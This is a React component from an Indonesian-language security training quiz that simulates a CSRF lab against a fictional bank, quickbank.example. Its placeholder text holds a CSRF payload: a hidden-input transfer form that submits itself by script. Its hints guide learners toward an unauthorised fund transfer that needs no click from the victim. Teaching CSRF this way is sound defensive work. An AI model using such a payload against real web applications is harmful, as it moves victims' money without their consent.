// Save as: utils/Quiz/A01/lab3/csrf-transfer-simulator.tsx
"use client";

import { useState, useTransition } from "react";
import { attemptCsrfTransfer } from "./CRSF-transter-attempts";
import type { CsrfTransferCriteria, CsrfTransferFailureReason } from "./CRSF-transfer-evaluator";
import type { ProgressCounters } from "@/../utils/Quiz/exercise-progress";

type Feedback = {
  outcome: "success" | "failure";
  notification_message: string;
  explanation: string;
  implementation_notes: string | null;
};

const FAILURE_HINTS: Record<CsrfTransferFailureReason, string> = {
  no_payload: "Textarea masih kosong. Tulis halaman HTML yang memuat form transfer.",
  no_form_to_transfer_endpoint:
    "Belum ada <form> dengan action mengarah ke endpoint /transfer. Pastikan atributnya benar.",
  wrong_target_account:
    "Hidden input 'to_account' belum ada, atau nilainya belum sesuai rekening tujuan penyerang.",
  wrong_amount: "Hidden input 'amount' belum ada, atau nilainya belum sesuai jumlah yang ditentukan.",
  no_auto_submit:
    "Form kamu sudah benar isinya, tapi korban tidak akan pernah mengklik apapun. Form ini perlu ter-submit otomatis lewat script.",
};

export default function CsrfTransferSimulator({
  categoryId,
  exerciseId,
  criteria,
  feedbackByOutcome,
  onCountersUpdate,
  onReconsiderPrompt,
}: {
  categoryId: string;
  exerciseId: string;
  criteria: CsrfTransferCriteria;
  feedbackByOutcome: Record<"success" | "failure", Feedback | undefined>;
  onCountersUpdate: (c: ProgressCounters) => void;
  onReconsiderPrompt: () => void;
}) {
  const [payload, setPayload] = useState("");
  const [lastResult, setLastResult] = useState<Awaited<ReturnType<typeof attemptCsrfTransfer>> | null>(null);
  const [isPending, startTransition] = useTransition();

  const submit = () => {
    startTransition(async () => {
      const result = await attemptCsrfTransfer(categoryId, exerciseId, criteria, payload);
      setLastResult(result);
      if (result.counters) {
        onCountersUpdate(result.counters);
        if (result.counters.reconsiderPrompt) onReconsiderPrompt();
      }
    });
  };

  const activeFeedback = lastResult
    ? feedbackByOutcome[lastResult.success ? "success" : "failure"]
    : null;

  return (
    <div className="mb-6 rounded-md border border-[#21262D] bg-[#161B22] p-6">
      <p className="mb-1 font-mono text-xs uppercase tracking-wider text-[#8B949E]">Simulasi — bukan sistem nyata</p>
      <h3 className="mb-4 text-lg font-medium text-[#E6EDF3]">{criteria.app_name} · Halaman Jahat Pihak Ketiga</h3>
      <p className="mb-3 text-xs text-[#8B949E]">
        Sesi korban di {criteria.app_name} masih aktif. Tulis halaman HTML yang, begitu dibuka korban, otomatis
        mengirim transfer dana ke rekening <code className="text-[#F0883E]">{criteria.target_account_attacker}</code>{" "}
        sejumlah <code className="text-[#F0883E]">{criteria.transfer_amount}</code>, tanpa korban perlu mengklik
        apapun.
      </p>

      <textarea
        value={payload}
        onChange={(e) => setPayload(e.target.value)}
        rows={8}
        className="w-full rounded border border-[#21262D] bg-[#0D1117] px-3 py-2 font-mono text-xs text-[#C9D1D9] focus:border-[#F0883E]/50 focus:outline-none"
        placeholder={`<form id="f" action="https://quickbank.example/transfer" method="POST">\n  <input type="hidden" name="to_account" value="...">\n  <input type="hidden" name="amount" value="...">\n</form>\n<script>document.getElementById('f').submit();</script>`}
      />

      <button
        onClick={submit}
        disabled={isPending || !payload.trim()}
        className="mt-3 rounded bg-[#F0883E] px-4 py-2 text-sm font-medium text-[#0D1117] hover:bg-[#F0883E]/90 disabled:opacity-50"
      >
        {isPending ? "Menguji…" : "Simulasikan Korban Membuka Halaman Ini"}
      </button>

      {lastResult && (
        <div
          className={`mt-4 rounded-md border px-4 py-3 text-sm ${
            lastResult.success
              ? "border-[#238636]/40 bg-[#238636]/10 text-[#3FB950]"
              : "border-[#F85149]/40 bg-[#F85149]/10 text-[#F85149]"
          }`}
        >
          <p className="font-medium">
            {activeFeedback?.notification_message ?? (lastResult.success ? "Berhasil." : "Belum berhasil.")}
          </p>
          <p className="mt-2 text-[#C9D1D9]">{activeFeedback?.explanation}</p>

          {!lastResult.success && lastResult.reason !== "ok" && (
            <div className="mt-3 rounded bg-[#0D1117] p-3 text-xs text-[#8B949E]">
              {FAILURE_HINTS[lastResult.reason]}
            </div>
          )}

          {lastResult.success && activeFeedback?.implementation_notes && (
            <pre className="mt-3 overflow-x-auto whitespace-pre-wrap rounded bg-[#0D1117] p-3 text-xs text-[#8B949E]">
              {activeFeedback.implementation_notes}
            </pre>
          )}
        </div>
      )}
    </div>
  );
}